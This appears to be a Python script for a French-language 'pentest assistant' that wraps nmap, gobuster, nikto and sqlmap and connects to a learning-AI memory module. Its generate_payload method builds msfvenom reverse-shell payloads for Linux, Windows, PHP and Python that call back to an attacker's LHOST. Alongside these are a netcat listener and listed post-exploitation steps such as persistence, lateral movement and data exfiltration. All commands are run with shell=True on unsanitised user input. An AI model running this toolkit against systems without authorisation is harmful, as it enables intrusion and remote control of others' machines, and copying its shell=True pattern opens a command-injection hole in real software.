import subprocess
import os

class PentestAssistant:
    def __init__(self, ai):
        self.ai = ai
        self.workspace = "/home/shpekoo/pentest-workspace"
        os.makedirs(self.workspace, exist_ok=True)
    
    def execute_command(self, command):
        """Ex√©cute une commande de pentesting"""
        try:
            result = subprocess.run(
                command,
                shell=True,
                capture_output=True,
                text=True,
                timeout=30,
                cwd=self.workspace
            )
            return {
                'success': True,
                'output': result.stdout,
                'error': result.stderr,
                'returncode': result.returncode
            }
        except Exception as e:
            return {'success': False, 'error': str(e)}
    
    def nmap_scan(self, target, scan_type='basic'):
        """Effectue un scan Nmap"""
        scans = {
            'basic': f'nmap {target}',
            'stealth': f'nmap -sS {target}',
            'version': f'nmap -sV {target}',
            'os': f'nmap -O {target}',
            'full': f'nmap -A -p- {target}',
            'vuln': f'nmap --script vuln {target}'
        }
        
        command = scans.get(scan_type, scans['basic'])
        print(f"üîç Ex√©cution: {command}")
        
        result = self.execute_command(command)
        
        if result['success']:
            # Sauvegarde le r√©sultat
            output_file = f"{self.workspace}/nmap_{target.replace('.', '_')}.txt"
            with open(output_file, 'w') as f:
                f.write(result['output'])
            
            return {
                'success': True,
                'output': result['output'],
                'file': output_file
            }
        
        return result
    
    def gobuster_scan(self, url, wordlist='/usr/share/wordlists/dirb/common.txt'):
        """Scan de r√©pertoires avec Gobuster"""
        command = f'gobuster dir -u {url} -w {wordlist} -q'
        print(f"üîç Ex√©cution: {command}")
        
        result = self.execute_command(command)
        
        if result['success']:
            output_file = f"{self.workspace}/gobuster_results.txt"
            with open(output_file, 'w') as f:
                f.write(result['output'])
            
            return {
                'success': True,
                'output': result['output'],
                'file': output_file
            }
        
        return result
    
    def nikto_scan(self, target):
        """Scan de vuln√©rabilit√©s web avec Nikto"""
        command = f'nikto -h {target}'
        print(f"üîç Ex√©cution: {command}")
        
        result = self.execute_command(command)
        
        if result['success']:
            output_file = f"{self.workspace}/nikto_results.txt"
            with open(output_file, 'w') as f:
                f.write(result['output'])
            
            return {
                'success': True,
                'output': result['output'],
                'file': output_file
            }
        
        return result
    
    def sqlmap_test(self, url):
        """Test SQL injection avec SQLmap"""
        command = f'sqlmap -u "{url}" --batch --risk=1 --level=1'
        print(f"üîç Ex√©cution: {command}")
        
        result = self.execute_command(command)
        
        return result
    
    def generate_payload(self, payload_type, lhost, lport):
        """G√©n√®re un payload avec msfvenom"""
        payloads = {
            'linux_reverse': f'msfvenom -p linux/x64/shell_reverse_tcp LHOST={lhost} LPORT={lport} -f elf -o {self.workspace}/payload.elf',
            'windows_reverse': f'msfvenom -p windows/x64/shell_reverse_tcp LHOST={lhost} LPORT={lport} -f exe -o {self.workspace}/payload.exe',
            'php_reverse': f'msfvenom -p php/reverse_php LHOST={lhost} LPORT={lport} -f raw -o {self.workspace}/payload.php',
            'python_reverse': f'msfvenom -p python/shell_reverse_tcp LHOST={lhost} LPORT={lport} -f raw -o {self.workspace}/payload.py'
        }
        
        command = payloads.get(payload_type)
        if not command:
            return {'success': False, 'error': 'Type de payload inconnu'}
        
        print(f"üîß G√©n√©ration: {command}")
        result = self.execute_command(command)
        
        return result
    
    def start_listener(self, port):
        """D√©marre un listener Netcat"""
        command = f'nc -lvnp {port}'
        print(f"üëÇ Listener sur le port {port}")
        print(f"Commande: {command}")
        print("‚ö†Ô∏è Ex√©cutez cette commande dans un terminal s√©par√©")
        
        return {'success': True, 'command': command}
    
    def suggest_next_step(self, current_phase):
        """Sugg√®re la prochaine √©tape du pentest"""
        phases = {
            'reconnaissance': [
                "1. Scan Nmap basique: nmap_scan(target, 'basic')",
                "2. Scan de versions: nmap_scan(target, 'version')",
                "3. Scan de vuln√©rabilit√©s: nmap_scan(target, 'vuln')",
                "4. √ânum√©ration DNS, WHOIS, etc."
            ],
            'scanning': [
                "1. Scan complet des ports: nmap_scan(target, 'full')",
                "2. Scan web: gobuster_scan(url)",
                "3. Scan Nikto: nikto_scan(target)",
                "4. Identifier les services vuln√©rables"
            ],
            'exploitation': [
                "1. Tester SQL injection: sqlmap_test(url)",
                "2. Chercher exploits: searchsploit service version",
                "3. Utiliser Metasploit",
                "4. G√©n√©rer payload: generate_payload(type, lhost, lport)"
            ],
            'post_exploitation': [
                "1. √âl√©vation de privil√®ges",
                "2. Persistence",
                "3. Lateral movement",
                "4. Exfiltration de donn√©es"
            ]
        }
        
        return phases.get(current_phase, ["Phase inconnue"])
    
    def pentest_workflow(self, target):
        """Workflow complet de pentest"""
        print("üéØ WORKFLOW DE PENTESTING")
        print("=" * 60)
        print(f"Cible: {target}\n")
        
        # Phase 1: Reconnaissance
        print("üìç PHASE 1: RECONNAISSANCE")
        print("Suggestions:")
        for step in self.suggest_next_step('reconnaissance'):
            print(f"  {step}")
        
        choice = input("\nEx√©cuter scan Nmap basique? (o/n): ")
        if choice.lower() == 'o':
            result = self.nmap_scan(target, 'basic')
            if result['success']:
                print(f"\n‚úÖ R√©sultats sauvegard√©s: {result['file']}")
                print(result['output'][:500])
        
        # Phase 2: Scanning
        print("\nüìç PHASE 2: SCANNING")
        print("Suggestions:")
        for step in self.suggest_next_step('scanning'):
            print(f"  {step}")
        
        # Phase 3: Exploitation
        print("\nüìç PHASE 3: EXPLOITATION")
        print("Suggestions:")
        for step in self.suggest_next_step('exploitation'):
            print(f"  {step}")
        
        print("\n‚úÖ Workflow termin√©!")
        print(f"üìÅ R√©sultats dans: {self.workspace}")

if __name__ == '__main__':
    from brain import LearningAI
    
    ai = LearningAI('memory.json')
    assistant = PentestAssistant(ai)
    
    print("üîê ASSISTANT PENTESTING")
    print("=" * 60)
    print("1. Workflow complet")
    print("2. Scan Nmap")
    print("3. Scan Gobuster")
    print("4. Scan Nikto")
    print("5. Test SQLmap")
    print("6. G√©n√©rer payload")
    print("7. Suggestions par phase")
    
    choice = input("\nChoix (1-7): ").strip()
    
    if choice == '1':
        target = input("Cible (IP ou domaine): ")
        assistant.pentest_workflow(target)
    
    elif choice == '2':
        target = input("Cible: ")
        scan_type = input("Type (basic/stealth/version/os/full/vuln): ")
        result = assistant.nmap_scan(target, scan_type)
        if result['success']:
            print(result['output'])
    
    elif choice == '3':
        url = input("URL: ")
        result = assistant.gobuster_scan(url)
        if result['success']:
            print(result['output'])
    
    elif choice == '4':
        target = input("Cible: ")
        result = assistant.nikto_scan(target)
        if result['success']:
            print(result['output'])
    
    elif choice == '5':
        url = input("URL avec param√®tre: ")
        result = assistant.sqlmap_test(url)
        if result['success']:
            print(result['output'])
    
    elif choice == '6':
        payload_type = input("Type (linux_reverse/windows_reverse/php_reverse/python_reverse): ")
        lhost = input("LHOST (votre IP): ")
        lport = input("LPORT: ")
        result = assistant.generate_payload(payload_type, lhost, lport)
        if result['success']:
            print("‚úÖ Payload g√©n√©r√©!")
    
    elif choice == '7':
        phase = input("Phase (reconnaissance/scanning/exploitation/post_exploitation): ")
        suggestions = assistant.suggest_next_step(phase)
        print("\nSuggestions:")
        for s in suggestions:
            print(f"  {s}")
